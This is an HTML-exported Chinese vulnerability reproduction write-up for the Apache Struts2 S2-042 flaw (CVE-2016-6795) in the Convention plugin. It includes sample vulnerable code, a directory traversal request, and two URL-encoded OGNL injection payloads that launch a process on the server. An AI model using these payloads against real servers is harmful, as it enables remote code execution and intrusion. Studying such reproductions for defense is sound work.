<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD36B4{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2016-6795s2-042"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2016-6795</span><span class="csECDA2D3">）</span><span class="csDE05BCC">s2-042</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在进行</span><span class="cs8926E06">struts2</span><span class="cs9C1B1871">开发时，需要在配置文件</span><span class="cs8926E06">(struts.xml)</span><span class="cs9C1B1871">中写一个个</span><span class="cs8926E06">action</span><span class="cs9C1B1871">，和对应返回结果的</span><span class="cs8926E06">result(</span><span class="cs9C1B1871">可以理解为前端返回的</span><span class="cs8926E06">jsp</span><span class="cs9C1B1871">文件</span><span class="cs8926E06">)</span><span class="cs9C1B1871">。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">但是，写的</span><span class="cs8926E06">action</span><span class="cs9C1B1871">多了，配置起来就显得特别繁琐了。</span><span class="cs8926E06">struts2 Convention</span><span class="cs9C1B1871">插件可以完全抛弃配置，也就是约定优于配置</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">通过这个插件来实现目录的遍历</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Struts 2.3.20 - Struts 2.3.31</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">测试环境搭建</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">**(1)**struts</span><span class="cs9C1B1871">版本</span><span class="cs8926E06">: struts2.3.24.1</span></li><li class="cs24C36B3"><span class="cs8926E06">**(2)**convention</span><span class="cs9C1B1871">插件版本</span><span class="cs8926E06">: struts2-convention-plugin-2.3.24.1</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">将</span><span class="cs9FB05234">struts2-convention-plugin-2.3.24.1.jar</span><span class="cs9C1B1871">复制到</span><span class="cs9FB05234">/WEB-INF/lib</span><span class="cs9C1B1871">目录下。</span></p><ol start="2" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908" value="2"><span class="cs9C1B1871">样例代码</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">新建一个</span><span class="cs8926E06">GoAction</span><span class="cs9C1B1871">类，放在</span><span class="cs9FB05234">action</span><span class="cs9C1B1871">包下</span><span class="cs8926E06">(</span><span class="cs9FB05234">convention</span><span class="cs9C1B1871">插件的默认约定位置</span><span class="cs8926E06">)</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">package action;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import com.opensymphony.xwork2.ActionSupport;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class GoAction extends ActionSupport {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;private String go;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;private String methodToOGNL;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String execute(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return go; &nbsp;//</span><span class="cs7FFD2630">方法的返回值，即为</span><span class="cs9FB05234">resultCode</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String getGo() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return go;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void setGo(String go) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.go = go;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String getMethodToOGNL() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return methodToOGNL;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void setMethodToOGNL(String methodToOGNL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.methodToOGNL = methodToOGNL;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs9FB05234">/WEB-INF/content</span><span class="cs9C1B1871">目录下，新建一个</span><span class="cs9FB05234">admin.jsp</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;body&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hello Admin~~ &lt;br&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;/body&gt; </span></p><ol start="3" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908" value="3"><span class="cs9C1B1871">攻击和调试分析</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">上述代码目的是，让</span><span class="cs9FB05234">GoAction</span><span class="cs9C1B1871">起到一个跳转功能。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当</span><span class="cs9FB05234">admin</span><span class="cs7FFD2630">用户</span><span class="cs9C1B1871">经过验证，需要跳转到</span><span class="cs9FB05234">jsp</span><span class="cs9C1B1871">页面时。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">直接访问</span><span class="cs9FB05234">url</span><span class="cs8926E06">:</span><span class="cs9FB05234">/go?go=admin</span><span class="cs9C1B1871">，此时的</span><span class="cs9FB05234">resultCode</span><span class="cs9C1B1871">为</span><span class="cs9FB05234">admin</span><span class="cs9C1B1871">。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">通过</span><span class="cs9FB05234">convention</span><span class="cs9C1B1871">插件，会在</span><span class="cs9FB05234">/WEB-INF/content</span><span class="cs9C1B1871">找到</span><span class="cs9FB05234">admin.jsp</span><span class="cs9C1B1871">，返回给用户。</span><span class="cs8926E06"><br/>1.png<br/></span><span class="cs9C1B1871">此时，我们就可以通过</span><span class="cs9FB05234">go</span><span class="cs9C1B1871">参数来控制</span><span class="cs9FB05234">resultCode</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">(1) </span><span class="csE3F655E4">遍历目录读取文件</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">不防先试试跨目录。测试</span><span class="cs8926E06">Payload</span><span class="cs9C1B1871">为</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org:8080/MyStruts2Test/go?go=../content/admin &nbsp;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这样也成功找到了</span><span class="cs9FB05234">admin.jsp</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，在</span><span class="cs9FB05234">/WEB-INF/</span><span class="cs9C1B1871">下新建一个</span><span class="cs9FB05234">hack.jsp</span><span class="cs7FFD2630">文件</span><span class="cs9C1B1871">。简单的跨目录读取成功</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png<br/></span><span class="cs5BEC2C28">(2)</span><span class="csE3F655E4">执行任意代码</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在补丁分析时，我们看到修补了一个</span><span class="cs9FB05234">Result</span><span class="cs9C1B1871">执行命令。于是，我们可以在</span><span class="cs9FB05234">resultCode</span><span class="cs9C1B1871">中嵌入</span><span class="cs9FB05234">ognl</span><span class="cs9C1B1871">代码试试</span><span class="cs8926E06">~ </span><span class="cs9C1B1871">我们最后要找到</span><span class="cs9FB05234">admin.jsp</span><span class="cs9C1B1871">文件，于是在路径中嵌入了如下</span><span class="cs8926E06">Payload:</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org:8080/MyStruts2Test/go?go=%24%7B%23_memberAccess%5B%22excludedClasses%22%5D%3D%7B1%7D%2Cnew%20java.lang.ProcessBuilder%28%27calc%27%29.start%28%29%7D%2f..%2fadmin</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">打断点分析可以看到</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">找到</span><span class="cs9FB05234">admin.jsp</span><span class="cs9C1B1871">文件后的</span><span class="cs8926E06">Result</span><span class="cs9C1B1871">为</span><span class="cs9FB05234">org.apache.struts2.dispatcher.ServletDispatcherResult</span><span class="cs9C1B1871">对象，并且</span><span class="cs9FB05234">parse</span><span class="cs9C1B1871">属性为</span><span class="cs8926E06">true</span><span class="cs9C1B1871">。</span><span class="cs9FB05234">location</span><span class="cs9C1B1871">属性中带有</span><span class="cs8926E06">OGNL</span><span class="cs9C1B1871">语句，和</span><span class="cs8926E06">S2-016</span><span class="cs9C1B1871">漏洞一样，成功运行植入的代码，弹出计算器</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">(3)</span><span class="csE3F655E4">另一种控制</span><span class="cs7FFD36B4">resultCode</span><span class="csE3F655E4">方法</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可能注意到了</span><span class="cs9FB05234">methodToOGNL</span><span class="cs9C1B1871">这个变量没有用，当我们可以选择调用</span><span class="cs9FB05234">action</span><span class="cs9C1B1871">的某个方法时，比如还有最近出现的</span><span class="cs9FB05234">rest</span><span class="cs9C1B1871">插件或者打开</span><span class="cs7FFD2630">动态方法调用</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;true&quot; /&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">于是就有了如下</span><span class="cs8926E06">payload:</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org:8080/MyStruts2Test/go!getMethodToOGNL?methodToOGNL=%24%7B%23_memberAccess%5B%22excludedClasses%22%5D%3D%7B1%7D%2Cnew%20java.lang.ProcessBuilder%28%27calc%27%29.start%28%29%7D%2f..%2fadmin</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我调用了</span><span class="cs9FB05234">getMethodToOGNL</span><span class="cs9C1B1871">方法，返回</span><span class="cs9FB05234">methodToOGNL</span><span class="cs9C1B1871">变量的值。就能简接控制</span><span class="cs9FB05234">resultCode</span><span class="cs9C1B1871">了。当然成功弹出计算器。这种情况，相比前面的情况。恐怕就要普遍些了吧</span><span class="cs8926E06">~</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">条件</span><span class="cs5BEC2C28">: </span><span class="csE3F655E4">只需</span><span class="cs7FFD36B4">action</span><span class="csE3F655E4">中有个</span><span class="cs7FFD36B4">String</span><span class="csE3F655E4">变量即可。</span></p></body>
</html>
